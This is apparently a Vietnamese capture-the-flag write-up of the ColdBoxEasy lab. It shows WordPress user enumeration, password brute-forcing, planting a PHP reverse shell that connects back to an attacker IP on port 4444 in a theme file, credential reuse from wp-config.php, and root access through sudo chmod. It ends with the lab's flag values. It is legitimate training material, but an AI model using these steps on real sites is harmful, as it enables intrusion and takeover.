# ColdBoxEasy

![image](https://hackmd.io/_uploads/S109p-6nGg.png)

![image](https://hackmd.io/_uploads/S1oj6-Thzg.png)

**Target:** Lab này yêu cầu chúng ta khai thác trên website WordPress và chiếm initial shell qua PHP reverse shell, sau đó leo thang đặc quyền (Privilege Escalation) lên `root` để đọc flag `local.txt` và `proof.txt`.

> Ý tưởng đơn giản khi đọc xong Description của mình là mình sẽ khai thác trang web tạo bằng WordPress và bằng cách nào đó vào được trang admin để thêm PHP reverse-shell code vào để mình có được shell trả về khi load PHP đó rồi từ đó tìm cách có root access để lấy flag.
## 1. Recon & Vulnerability Assessment

Đầu tiên, chúng ta sẽ dùng lệnh `nmap` để rà quét xem port nào đang mở và dịch vụ tương ứng:

```bash
nmap -sC -sV <IP>
```

*Trong đó:*

- **`-sC`**: Hiển thị script mặc định của nmap (tương tác nhẹ với web).
- **`-sV`**: Hiển thị phiên bản (version) của dịch vụ.

![image](https://hackmd.io/_uploads/ry6k07C2zg.png)

Sau khi chạy xong, ta thấy được port 80 đang mở và server đang chạy dịch vụ web nền tảng WordPress.

Tiếp đến, mình dùng tool `wpscan` để quét thêm thông tin và liệt kê danh sách người dùng (User Enumeration):

```bash
wpscan --url http://<IP> -e u
```

- **`-e u`**: Lệnh yêu cầu hiển thị thêm tên người dùng.

![image](https://hackmd.io/_uploads/HJDYC7ChMx.png)


> Quá trình quét phát hiện ra 3 user. Mình nghi ngờ **`c0ldd`** là tài khoản admin vì đây cũng chính là tên tác giả (author) của bài lab này.

## 2. Initial Access

Bây giờ, mình sẽ tiến hành brute-force mật khẩu của tài khoản `c0ldd` bằng `wpscan` kết hợp với từ điển `rockyou.txt`:

```bash
wpscan --url http://<IP> -U c0ldd -P /usr/share/wordlists/rockyou.txt
```

*Trong đó:*

- **`-U`**: Username mục tiêu.
- **`-P`**: Đường dẫn tới file password.

*(Lưu ý: Nếu các bạn không thấy file `rockyou.txt` trên Kali thì có thể do file đang bị nén `.gz`, hoặc nếu không có thì có thể tải về bằng lệnh: `git clone https://github.com/RykerWilder/rockyou.txt.git`)*

![image](https://hackmd.io/_uploads/rJ-wJVA3Ge.png)


> Password tìm được trùng khớp là `9876543210`.

Sử dụng tài khoản này, mình đăng nhập thành công vào trang admin (`/wp-admin`).

Để có được **Reverse Shell**, chúng ta phải tìm cách thực thi đoạn mã độc (exploit code). Sau một lúc thao tác trên web, mình thấy trong menu **Appearance** có mục **Theme Editor** (cho phép sửa code giao diện trực tiếp). Mình sẽ chèn exploit code vào đây để khi website load lên sẽ thực thi đoạn code đó.

![image](https://hackmd.io/_uploads/rJ-jkE02Gx.png)


### Khai thác (Exploit)

1. Mình quyết định chèn đoạn **php-reverse-shell** (copy từ [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)) vào file `404.php`.
2. Mình có chỉnh sửa vài thông số trong code để trỏ về máy của mình:

```php
$ip = '192.168.45.238'; // IP của máy bạn để shell có thể trả về
$port = 4444;
...
```

3. Sau khi chèn xong thì ấn **Update File** để lưu code.
4. Đồng thời, mở một terminal khác lên và chạy Netcat để lắng nghe kết nối:

```bash
nc -nvlp 4444
```

5. Thử truy cập vào đường dẫn `/wp-content/themes/404.php` để kích hoạt nhưng không thấy gì trả về cả.
6. Mình thử đổi chiến thuật, chèn đoạn exploit code đó vào file `footer.php` (hoặc `header.php`) và **Update File**. Load lại trang chủ...

=> Kết quả: **Shell đã được trả về!**

Tuy nhiên shell lúc này bị giới hạn chức năng (không dùng được phím mũi tên hay phím tab). Để thuận tiện làm việc, mình dùng Python để nâng cấp lên TTY hoàn chỉnh:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## 3. Privilege Escalation

Sau khi vào được shell dưới quyền user web (`www-data`), chúng ta sẽ tìm cách leo lên quyền root.

![image](https://hackmd.io/_uploads/r1VS-4Anzl.png)


Trước tiên, mình sẽ xem trong file cấu hình cốt lõi `wp-config.php` có chứa mật khẩu nào không:

```bash
www-data@ColdBox-Easy:~$ find / -type f -name "wp-config.php" 2>/dev/null
/var/www/html/wp-config.php
www-data@ColdBox-Easy:~$ cat /var/www/html/wp-config.php
```

![image](https://hackmd.io/_uploads/BJwo-4Rnze.png)


> 💡 **Finding:** Tìm thấy mật khẩu Database là `cybersecurity`.

Dùng mật khẩu đó để chuyển sang user `c0ldd`:

```bash
www-data@ColdBox-Easy:~$ su c0ldd
Password: cybersecurity
c0ldd@ColdBox-Easy:~$
```

![image](https://hackmd.io/_uploads/HJDAW4R2Gx.png)


Lúc này chúng ta mới chỉ ở không biết `c0ldd` có quyền root không ?. Để tìm đường lên root, mình kiểm tra xem tài khoản `c0ldd` được cấp đặc quyền sudo nào không :

```bash
c0ldd@ColdBox-Easy:~$ sudo -l
```

![image](https://hackmd.io/_uploads/ryDEM4C2Gl.png)


=> Hệ thống báo rằng `c0ldd` được phép chạy lệnh `chmod` dưới danh nghĩa root.

Mình thử di chuyển vào thư mục gốc của root thì bị từ chối (`Permission Denied`). Do đó, mình sẽ lợi dụng quyền `chmod` vừa tìm thấy để mở khóa toàn bộ quyền (777) cho thư mục này:

```bash
c0ldd@ColdBox-Easy:/$ LFILE=root
c0ldd@ColdBox-Easy:/$ sudo chmod 777 $LFILE
c0ldd@ColdBox-Easy:/$ cd /root
c0ldd@ColdBox-Easy:/root$
```

![image](https://hackmd.io/_uploads/BJgLmNA3Mx.png)

Vậy là đã vượt rào thành công và vào được terminal của thư mục root

## 4. Result

Tại thư mục root, mình đã thấy file `proof.txt`.
Tiếp theo, mình dùng lệnh `find` để tìm kiếm nốt vị trí file `local.txt`:

```bash
find / -type f -name "local.txt" 2>/dev/null
```

![image](https://hackmd.io/_uploads/B1TDQN0hGe.png)

Cuối cùng, dùng lệnh `cat` in ra nội dung 2 file để lấy flag.

![image](https://hackmd.io/_uploads/r1ftX4Ahfx.png)

> 🚩 **Flags:**
> - **local.txt:** `6032a8d5d337fd84f558ab539822fd04`
> - **proof.txt:** `7d50ca78a06071c9c1a03ac77358bee4`